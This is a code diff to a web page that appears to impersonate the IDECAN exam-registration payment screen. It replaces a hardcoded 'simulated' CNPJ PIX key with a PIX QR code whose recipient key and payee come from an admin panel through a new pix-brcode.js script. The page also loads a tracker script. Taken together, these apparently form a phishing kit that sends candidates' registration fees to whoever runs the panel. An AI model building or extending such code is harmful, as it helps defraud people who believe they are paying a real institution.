@@ -285,6 +285,11 @@ body > center > #Rodape   { flex: 0 0 auto; }
   try { inscricoes = JSON.parse(sessionStorage.getItem('idecan_inscricoes') || '[]'); } catch(e){}
   if(!Array.isArray(inscricoes)) inscricoes = [];
 
+  /* Pré-carrega a config do PIX (chave/beneficiário cadastrados no painel admin) */
+  if (window.IdecanPix && window.IdecanPix.load) {
+    try { window.IdecanPix.load(); } catch (e) {}
+  }
+
   /* Fallback: inscrição única antiga */
   if(inscricoes.length === 0){
     try {
@@ -491,7 +496,7 @@ body > center > #Rodape   { flex: 0 0 auto; }
     return svg;
   }
 
-  function abrirModal(idx){
+  async function abrirModal(idx){
     buildModal();
     var ins = inscricoes[idx];
     if(!ins) return;
@@ -509,19 +514,19 @@ body > center > #Rodape   { flex: 0 0 auto; }
       '<b>Protocolo:</b><span>' + escape(ins.protocolo) + '</span>';
     document.getElementById('modal-valor').textContent = taxa;
 
-    /* Gera código PIX (BR Code simulado, formato EMV) */
-    var taxaNum = (taxa.replace(/[^\d,]/g,'').replace(',','.')) || '0';
-    var pixKey = '12345678000190'; /* CNPJ simulado IDECAN */
-    var nomeRec = 'IDECAN INSTITUTO DE DESENV';
-    var cidadeRec = 'BRASILIA';
-    var txid = ins.protocolo || ('IDC' + Date.now());
-    var pixCode =
-      '00020126580014BR.GOV.BCB.PIX0114' + pixKey +
-      '52040000530398654' + ('0'+taxaNum.length).slice(-2) + taxaNum +
-      '5802BR5925' + nomeRec.slice(0,25).padEnd(25,' ').trim() +
-      '6008' + cidadeRec.slice(0,8).padEnd(8,' ').trim() +
-      '62' + ('0'+(4+txid.length)).slice(-2) + '05' + ('0'+txid.length).slice(-2) + txid +
-      '6304ABCD';
+    /* Gera código PIX (BR Code EMV) usando a chave configurada no painel admin */
+    var taxaNum = parseFloat((taxa || '').replace(/[^\d,]/g, '').replace(',', '.')) || 0;
+    var txid = (ins.protocolo || ('IDC' + Date.now())).replace(/[^A-Za-z0-9]/g, '').slice(0, 25);
+    if (window.IdecanPix && window.IdecanPix.load) {
+      try { await window.IdecanPix.load(); } catch (e) {}
+    }
+    var pixCode = (window.IdecanPix && window.IdecanPix.build)
+      ? window.IdecanPix.build({
+          valor: taxaNum,
+          txid: txid,
+          info: 'Inscricao ' + (ins.titulo || '').toString().slice(0, 30)
+        })
+      : '';
     document.getElementById('modal-pix-text').value = pixCode;
     document.getElementById('modal-qr').innerHTML = gerarQR(pixCode, 200);
     document.getElementById('modal-copied').classList.remove('show');
@@ -566,18 +571,15 @@ body > center > #Rodape   { flex: 0 0 auto; }
     var exp = new Date(now.getTime() + 30*60*1000);
     var dataExp = pad(exp.getDate())+'/'+pad(exp.getMonth()+1)+'/'+exp.getFullYear()+' '+pad(exp.getHours())+':'+pad(exp.getMinutes());
 
-    var taxaNum = (ins.taxa || '').replace(/[^\d,]/g,'').replace(',','.') || '0';
-    var pixKey = '12345678000190';
-    var nomeRec = 'IDECAN INSTITUTO DESENV';
-    var cidadeRec = 'BRASILIA';
-    var txid = ins.protocolo || ('IDC' + Date.now());
-    var pixCode =
-      '00020126580014BR.GOV.BCB.PIX0114' + pixKey +
-      '52040000530398654' + ('0'+taxaNum.length).slice(-2) + taxaNum +
-      '5802BR5923' + nomeRec.slice(0,23) +
-      '6008' + cidadeRec.slice(0,8) +
-      '62' + ('0'+(4+txid.length)).slice(-2) + '05' + ('0'+txid.length).slice(-2) + txid +
-      '6304ABCD';
+    var taxaNum = parseFloat((ins.taxa || '').replace(/[^\d,]/g, '').replace(',', '.')) || 0;
+    var txid = (ins.protocolo || ('IDC' + Date.now())).replace(/[^A-Za-z0-9]/g, '').slice(0, 25);
+    var pixCode = (window.IdecanPix && window.IdecanPix.build)
+      ? window.IdecanPix.build({
+          valor: taxaNum,
+          txid: txid,
+          info: 'Inscricao ' + (ins.titulo || '').toString().slice(0, 30)
+        })
+      : '';
     var qrSvg = gerarQR(pixCode, 170);
 
     var cargoLabel = (ins.codigo ? ins.codigo + ' - ' : '') + (ins.titulo || '') + (ins.jornada ? ' - ' + ins.jornada : '');
@@ -714,6 +716,7 @@ body > center > #Rodape   { flex: 0 0 auto; }
 </script>
 <script src="/assets/auth.js"></script>
 <script src="/assets/login-modal.js"></script>
+<script src="/assets/pix-brcode.js"></script>
 <script src="/assets/notice.js"></script>
 <script src="/assets/tracker.js"></script>
 </body>
